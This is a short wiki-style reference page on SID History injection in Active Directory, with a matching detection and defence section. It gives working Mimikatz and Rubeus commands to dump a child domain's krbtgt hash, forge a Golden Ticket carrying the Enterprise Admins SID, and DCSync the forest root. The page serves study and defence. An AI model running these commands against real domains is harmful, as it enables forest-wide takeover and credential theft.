---
title: SID History Injection
slug: sidhistory-injection
---

> **TL;DR:** Forging a Golden Ticket whose PAC carries an extra `ExtraSids` entry for a parent-domain or foreign-forest privileged group yields cross-domain Enterprise Admin in one hop.

## What it is
The Kerberos PAC carries an `ExtraSids` field originally intended for legitimate domain migrations: SIDs from a user's previous domain are stamped here so they keep their access. Sean Metcalf and Benjamin Delpy weaponised this in 2015 with Mimikatz — by crafting a Golden Ticket inside a child domain and adding the parent's `Enterprise Admins` SID (`S-1-5-21-<root>-519`) to `ExtraSids`, the attacker bypasses SID Filtering (disabled by default inside the same forest) and authenticates to the root DC as EA. Outcome: forest-wide compromise from any child-domain DC's krbtgt hash.

## Preconditions / where it applies
- krbtgt NT hash (or AES key) of a child domain — typically via DCSync
- SID Filtering not enforced on the parent trust (default for intra-forest trusts; opt-in for external trusts)
- Knowledge of the parent domain SID and the privileged group RID (519 = Enterprise Admins, 512 = Domain Admins, etc.)
- Network reach to a root-domain DC

## Technique
Forge the ticket with Mimikatz or Rubeus, then DCSync the forest root.

```powershell
# 1. From the child domain, pull krbtgt hash
mimikatz # lsadump::dcsync /domain:child.corp.local /user:krbtgt

# 2. Forge Golden Ticket with parent EA SID injected
mimikatz # kerberos::golden /user:Administrator `
    /domain:child.corp.local `
    /sid:S-1-5-21-1111-2222-3333 `
    /krbtgt:<rc4-hash> `
    /sids:S-1-5-21-4444-5555-6666-519 `
    /ptt

# 3. DCSync the forest root using the injected EA membership
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

Rubeus equivalent: `Rubeus.exe golden /aes256:<key> /user:Administrator /id:500 /domain:child.corp.local /sid:<child-sid> /sids:<parent-sid>-519 /ptt`.

## Detection and defence
- Event ID 4769 on root-domain DCs where the requested service belongs to root but the client realm is the child — anomalous when paired with privileged group access
- Event ID 4662 (DCSync) on the root DC originated from a child-domain account
- Enable SID Filtering Quarantine (`netdom trust ... /quarantine:yes`) on external/forest trusts; consider it for intra-forest trusts where tier separation matters
- Rotate krbtgt twice in every domain on a 180-day cadence (Microsoft `New-KrbtgtKeys.ps1`)
- Defender for Identity "Suspected Golden Ticket usage (nonexistent account)" and "Identity theft using Pass-the-Ticket" rules

## References
- [Sean Metcalf — Sneaky AD Persistence #15 (SID History)](https://adsecurity.org/?p=1772) — primitive writeup
- [Microsoft — Security considerations for trusts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-considerations-for-trusts) — SID Filtering guidance

See also: [[golden-tickets]], [[dcsync]], [[child-to-forest-root]], [[cross-forest-trust-abuse]].
